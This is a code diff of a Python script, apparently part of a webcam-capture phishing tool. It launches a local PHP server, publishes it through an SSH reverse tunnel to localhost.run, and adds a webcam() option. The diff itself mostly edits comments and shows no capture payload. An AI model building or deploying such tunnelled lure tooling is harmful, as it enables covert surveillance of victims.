@@ -12,17 +12,18 @@ try:
     import pandas as pd
 except (ImportError , ModuleNotFoundError):
     subprocess.call("pip install colorama pandas" , shell=True)
-#====================================================================================================
+    sys.exit()
+#Run localhost====================================================================================================
 def php_server():
     with open("Server" , "w") as log:
         subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
-#====================================================================================================
+#Change localhost to Server====================================================================================================
 def loaclhost():
     global port
 
     with open("localhost.txt" , "w") as local:
         subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
-#====================================================================================================
+#Run with Sudo command ====================================================================================================
 if os.name == "posix":
     uid = os.getuid()
     if uid == 1000:
@@ -30,14 +31,14 @@ if os.name == "posix":
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Run with sudo command for running the localhost {Fore.GREEN}(sudo python Spark.py)""")
 else:
     pass
-#====================================================================================================
+#type smothly ====================================================================================================
 def Sprint(text):
   for character in text:
     sys.stdout.write(character)
     sys.stdout.flush()
     sleep(0.1)
 
-#====================================================================================================
+#Check php is installed ====================================================================================================
 
 check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)
 
@@ -45,7 +46,7 @@ if check != 0:
     print(f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
     sys.exit()
 
-#====================================================================================================
+#Clear Page ====================================================================================================
 def clear():
     if os.name == "nt":
         os.system("cls")
@@ -74,10 +75,10 @@ print(fr"""{random.choice(Banner_color)}
 {Fore.RESET}""")
 
 
-#option 1 ====================================================================================================
+#====================================================================================================
 def webcam():
     global port
-#====================================================================================================
+#Select port ====================================================================================================
     try:
         port = int(input(Fore.MAGENTA + f"\r\nWhich Port Want To Open {Fore.GREEN}(Default 80){Fore.BLUE} : " + Fore.RESET))
     except KeyboardInterrupt:
